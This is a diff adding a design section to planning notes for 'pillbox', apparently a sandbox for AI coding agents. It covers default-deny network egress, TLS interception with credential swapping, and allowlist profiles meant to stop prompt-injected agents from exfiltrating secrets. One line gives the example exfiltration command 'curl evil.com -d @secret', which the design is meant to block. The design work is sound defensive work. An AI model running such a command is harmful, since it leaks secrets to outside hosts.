@@ -222,6 +222,97 @@ architecture diagram calls for, now proven to coexist on libkrun.
   `SessionLog` (seq + notify-follow already built, transport-agnostic); the guest
   half is the event mapper (`drain_sse` / transcript tailer) feeding this port.
 
+## Egress + vault v2 (step 5 — design)
+
+This is the **novel** step — not a port of existing logic like 3/4, and the one
+that makes the pitch's first word (*secure* — safe to run a prompt-injected
+agent) real beyond VM isolation. It's the hardest piece in the plan, so it gets
+a design before a spike.
+
+### The networking decision: boot on TSI, egress on virtio-net + smoltcp
+
+libkrun offers two ways to give the guest a network:
+
+- **TSI** (Transparent Socket Impersonation) — libkrun proxies the guest's
+  socket syscalls through the *host kernel's* sockets. Zero-config, simplest
+  boot. But the host kernel makes the real connections, so pillbox gets **no
+  userspace termination point it controls** — nowhere to gate, MITM, or measure.
+  Fine for "just give it internet"; useless for vault v2.
+- **virtio-net + a host-side userspace TCP stack ([smoltcp](https://github.com/smoltcp-rs/smoltcp))**
+  — the guest sees a real NIC; its packets land in a stack **pillbox owns and
+  terminates in userspace**. That termination point is the single control plane
+  for all three priorities (gate, vault, telemetry). This is microsandbox's model.
+
+**Decision:** boot on TSI (steps 1–4 don't need egress); switch to
+virtio-net + smoltcp *in this step*, because every vault-v2 control lives at
+that userspace termination point. Egress is the reason to own the stack.
+
+### Three egress tiers at the termination point
+
+Every guest-initiated connection hits the smoltcp stack; pillbox reads the TLS
+**ClientHello SNI** at connect time and routes to one of three tiers:
+
+1. **Provider host** (`api.anthropic.com`, `api.openai.com`, `github.com` for the
+   token, …) → **MITM-terminate** with the per-pillbox CA (guest already trusts
+   it), hand the plaintext `Request`/`Response` to **today's `VaultProvider`
+   stack unchanged** (stub→real out, real→stub in, rotate-token persist), and
+   emit gen_ai/usage telemetry. The provider logic is hyper-level and survives
+   the pivot verbatim — only its *substrate* moves (sidecar + `HTTPS_PROXY` →
+   smoltcp).
+2. **Allowlisted non-provider host** (per profile: package registries, git
+   hosts, …) → **TCP pass-through**, no MITM (no credential to swap, so no cert
+   trust needed — the guest sees the real upstream cert). Allowed, but only SNI/
+   byte-count telemetry, never plaintext.
+3. **Everything else** → **default-deny**: RST at connect. This is the
+   exfiltration guard today's proxy lacks (`vault/server.rs` passes unmatched
+   hosts through unmodified). An injected agent's `curl evil.com -d @secret`
+   never opens a socket.
+
+### The two hardening gates v2 adds over today's blind swap
+
+Today's swap is keyed on the *claimed* host and releases the real credential to
+whatever that host resolves to. v2 adds:
+
+- **Default-deny allowlist** (tier 3 above) — egress is closed by default; the
+  agent reaches only what the profile permits. This is also the **prerequisite
+  for cross-user pooling**: the [swarm-memory](./swarm-memory.md) scrub is
+  zero-false-negative only when *all* egress is inspected, which only holds once
+  unmatched hosts can't slip out (see [security.md](./security.md)).
+- **Destination-verified credential release** — the real key is injected only
+  after pillbox's *own* outbound TLS connection to the upstream verifies the
+  cert chains to the real CA for the allowlisted host. Binds the credential to a
+  **proven** destination, defeating DNS spoofing / a hijacked `api.anthropic.com`
+  / a malicious upstream. Today's MITM trusts the system roots implicitly; v2
+  makes destination-pinning an explicit precondition of release.
+
+### Egress profiles (from brood-box)
+
+Orthogonal UX over the allowlist; the secret-file exclusion (step 6) is the
+filesystem sibling, kept separate.
+
+- **`locked`** — allowlist = provider hosts only. The agent can authenticate and
+  nothing else. Maximum safety for fully-untrusted code.
+- **`standard`** (default) — providers + a curated dev allowlist (git hosts,
+  common package registries).
+- **`permissive`** — all egress allowed, but provider hosts are *still*
+  MITM+swapped (≈ today's posture). For code you trust.
+
+An untrusted repo **cannot widen** its own profile (brood-box's non-negotiable
+rule) — the profile is set by the invoker, not the workspace.
+
+### What the step-5 spike proves (proof-first, like 1–4)
+
+1. Guest boots on **virtio-net** (not TSI) with a default route to the host stack.
+2. A **smoltcp** userspace stack on the host terminates the guest's TCP.
+3. One **outbound TLS** connection from the guest (e.g. `curl https://api.anthropic.com`)
+   is **MITM-terminated** at the stack and its `x-api-key` stub→real swap runs
+   through the **existing `AnthropicProvider`** — proving the provider stack
+   re-hosts on smoltcp untouched.
+4. A connection to a **non-allowlisted** host gets **RST at connect** (default-deny).
+
+Vault v2's destination-verification + the full profile matrix layer on once that
+pipe is green — same "transport first, policy on top" cadence as the attach port.
+
 ## Build order (proof-first)
 
 1. ✅ **Boot proof** — done. FFI = hand-written; rootfs = OCI/Alpine dir;
@@ -234,8 +325,10 @@ architecture diagram calls for, now proven to coexist on libkrun.
 4. ✅ **§0 producer** — done. `contract::Event` NDJSON streams over a second
    concurrent vsock port → host seq-authority → durable `log.jsonl` → replay
    verified. Real contract types vendored both ends. Recipe above.
-5. **Egress + vault v2** — smoltcp stack: TLS-verified credential substitution +
-   default-deny egress + profiles + network telemetry.
+5. **Egress + vault v2** — design done (see [§ Egress + vault v2](#egress--vault-v2-step-5--design));
+   spike next: virtio-net + smoltcp termination, three egress tiers, the existing
+   `VaultProvider` stack re-hosted on the stack, default-deny RST. Then layer
+   destination-verification + the profile matrix.
 6. **Workspace** — COW snapshot + non-negotiable secret-file exclusion.
 7. **opencode** — repoint the bridge transport to the control channel, and pay
    down the structural debt a 2026-06-01 review flagged (deferred then because
